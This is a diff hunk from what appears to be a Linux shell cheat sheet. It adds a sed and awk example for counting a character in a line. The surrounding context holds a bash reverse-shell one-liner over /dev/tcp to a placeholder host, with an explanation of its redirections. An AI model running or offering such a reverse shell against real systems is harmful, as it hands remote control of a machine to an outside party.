@@ -312,6 +312,11 @@ Start reverse shell:              bash -i >& /dev/tcp/<host>/<port> 0>&1     (re
 The code to start a reverse shell runs a new interactive instance of bash (bash -i), on a TCP connection to the specified port on the specified host which is created for the duration of the bash process. Standard output and standard error are sent through this connection (>&), and standard input is read through this connection (0>&1 — this should be 0<&1 but 0>&1 works too).
 
 
+Combining commands:
+
+- Count the number of specific characters in a line: 
+CHAR=',' && echo a,b,,,e | sed "s/[^$CHAR]//g" | awk '{ print length }'
+
 
 Secure Shell (SSH):
 
